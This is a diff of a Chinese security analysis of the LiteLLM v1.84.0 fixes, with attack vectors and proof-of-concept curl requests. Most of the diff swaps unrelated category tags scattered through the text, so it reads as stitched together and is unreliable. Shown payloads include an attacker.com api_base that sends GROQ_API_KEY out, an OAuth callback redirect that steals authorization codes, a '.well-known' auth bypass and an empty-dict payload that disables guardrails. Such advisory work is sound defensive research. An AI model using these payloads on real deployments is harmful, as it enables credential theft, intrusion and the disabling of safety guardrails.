@@ -9,13 +9,13 @@ asset_dir: embedded-base64
 > 分析方法：GHSA 分析器五阶段框架（提取→定位→验证→分析→证明）  
 > 覆盖范围：v1.84.0 Release Note 中全部 23 个安全相关 PR
 >
-> 黑客与破解
+> 计算机安全
 
 ---
 
 ## 一、漏洞概要
 
-| 维度 | [数据](#) |
+| 维度 | 数据 |
 | --- | --- |
 | 总安全 PR | 23 个 |
 | 高危漏洞 | 7 个（认证/授权绕过） |
@@ -31,6 +31,14 @@ asset_dir: embedded-base64
 
 ### 2.1 PR #26463 — MCP 公共路由检测绕过 + OAuth2 Fallback
 
+深入探索
+
+报纸
+
+数据格式与协议
+
+防病毒程序与恶意软件
+
 **[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "标签：漏洞")类型**: 认证绕过 (CWE-290)  
 **修复文件**: `litellm/proxy/_experimental/mcp_server/auth/user_api_key_auth_mcp.py`
 
@@ -43,7 +51,7 @@ asset_dir: embedded-base64
 
 **攻击向量**: 在 URL 的 query string 中注入 `.well-known` 子字符串（如 `?redirect=.well-known`），使请求被误判为公开路由，跳过认证。
 
-数学
+新闻
 
 **OAuth2 Fallback**:
 
@@ -71,9 +79,9 @@ asset_dir: embedded-base64
 修复后: response = safe_get(sync_handler, api_base)  (SSRF 防护)
 ```
 
-**攻击向量**: `api_base=https://attacker.com/api.groq.com/openai/v1` 冒充 Groq 端点，代理读取 GROQ\_API\_KEY 并发送到攻击者服务器。
+**攻击向量**: `api_base=https://attacker.com/api.groq.com/openai/v1` 冒充 Groq 端点，[代理](#)读取 GROQ\_API\_KEY 并发送到攻击者服务器。
 
-新闻学与新闻业
+开放源代码
 
 **额外加固**: 新增 9 个 banned params（langsmith\_base\_url, langfuse\_host, posthog\_host 等）
 
@@ -93,14 +101,6 @@ asset_dir: embedded-base64
 修复后: 拆分为独立 early return
         available-team 仅允许 self-join 且 role="user"
 ```
-
-深入探索
-
-VPN 与远程访问
-
-机器学习与人工智能
-
-代理
 
 **攻击向量**: 任意已认证用户向 available-team 发送 `POST /team/member_add`，以 admin 角色将自己添加为成员。
 
@@ -125,7 +125,7 @@ VPN 与远程访问
 
 **攻击向量**: 发送 `{"metadata": {"guardrails": {}}}` 绕过 guardrail 修改权限，下游将空 dict 解读为"禁用所有 guardrails"。
 
-黑客与破解
+计算机服务器
 
 ---
 
@@ -163,7 +163,7 @@ VPN 与远程访问
 
 **攻击向量**: 构造恶意 OAuth state，将 client\_redirect\_uri 设为 `https://attacker.com/cb`，callback 将 authorization code 重定向到攻击者域名。
 
-网络
+编程
 
 ---
 
@@ -244,7 +244,7 @@ VPN 与远程访问
 
 按 GHSA 分析器验证框架，对每个 PR 的分析结论逐项与实际 diff 对照。
 
-编程
+代理与过滤
 
 ### 审核结论
 
@@ -365,7 +365,7 @@ Host: target:4000
 
 **判断依据**: 200 + 响应包含 API key = 劫持成功；需要 poll\_secret = 已修复
 
-黑客与破解
+网络
 
 ---
 
@@ -394,7 +394,7 @@ Authorization: Bearer sk-regular-user-key
 
 **判断依据**: 200 + 成员角色为 admin = 提权成功；403 = 已修复
 
-数学
+编程
 
 #### PoC #26831: Batch 身份冒用
 
@@ -431,7 +431,7 @@ Authorization: Bearer sk-regular-user-key
 
 **判断依据**: 200 + 无 guardrail 拦截 = 绕过成功；403 guardrail violation = 已修复
 
-数据格式与协议
+开放源代码
 
 #### PoC #26827: Passthrough 默认无认证
 
@@ -465,7 +465,7 @@ curl -v "http://target:4000/mcp/oauth/callback?code=stolen-auth-code&state=malic
 
 **判断依据**: 302 重定向到 attacker.com/cb?code=... = code 窃取成功；400 invalid redirect = 已修复
 
-编程
+网络安全
 
 #### PoC #26849: SSRF via OAuth Metadata Discovery
 
@@ -491,7 +491,7 @@ curl -v "http://target:4000/get_image?width=100"
 
 **判断依据**: 响应包含内网服务内容 = SSRF 成功；302 重定向或空响应 = 已修复
 
-网络安全
+计算机安全
 
 #### PoC #26815-B: Logo 路径泄露
 
@@ -518,7 +518,7 @@ curl -v -X POST http://target:4000/chat/completions \
 
 **判断依据**: 响应头包含 `x-injected-evil` = 注入成功；header 被过滤 = 已修复
 
-计算机安全
+VPN 与远程访问
 
 #### PoC #26862-B: Audit Log Spoofing
 
@@ -551,7 +551,7 @@ curl -v -X POST http://target:4000/v1/chat/completions \
 
 **判断依据**: 请求发送到畸形 AWS endpoint = 注入成功；400 invalid region = 已修复
 
-黑客与破解
+开放源代码
 
 #### PoC #27794: 任意文件读取
 
@@ -580,7 +580,7 @@ curl -v -X POST http://target:4000/v1/chat/completions \
 
 **判断依据**: 请求成功 + 预算预留被锁定为团队全部余额 = DoS 成功；400 max\_tokens exceeded = 已修复
 
-数据格式与协议
+计算机安全
 
 #### PoC #26809: 预算绕过 via null budget
 
@@ -610,8 +610,6 @@ curl -v -X POST http://target:4000/team/callback_new \
 ```
 
 **判断依据**: 审计日志无此操作记录 = 日志缺失；审计日志存在且 secret\_key 脱敏 = 已修复
-
-计算机安全
 
 #### PoC #27554: Jinja2 模板注入
 
@@ -658,8 +656,6 @@ curl -v -X POST "http://target:4000/v1/chat/completions" \
 
 **判断依据**: 错误响应包含 prompt\_variables 及其值 = 泄露；仅包含 Prompt id = 已修复
 
-黑客与破解
-
 #### PoC #26489: 向量存储凭据泄露
 
 ```
@@ -702,8 +698,6 @@ curl -v -X POST "http://target:4000/v1/chat/completions" \
 
 **判断依据**: 回调日志中包含真实 DATABASE\_URL/AWS\_SECRET = 泄露；key 创建被拒绝 = 已修复
 
-计算机安全
-
 #### PoC #26836: MCP 凭据明文存储
 
 ```
@@ -721,6 +715,8 @@ FROM "LiteLLM_MCPUserCredentials";
 ```
 
 **判断依据**: base64 解码后得到明文 API key = 明文存储；解码后为不可读二进制 = 已加密
+
+开放源代码
 
 ---
 
@@ -751,7 +747,7 @@ pip install litellm>=1.84.3
 ### 临时缓解
 
 1. **WAF 规则**: 阻止 `.well-known` 出现在 query string 中
-2. **反向代理**: 在 proxy 层过滤 Host header
+2. **反向[代理](#)**: 在 proxy 层过滤 Host header
 3. **网络隔离**: 限制 LiteLLM 实例对内网 metadata endpoint 的访问
 4. **日志监控**: 监控 /metrics 端点访问和异常错误消息
 5. **最小权限**: 限制 API key 的权限范围
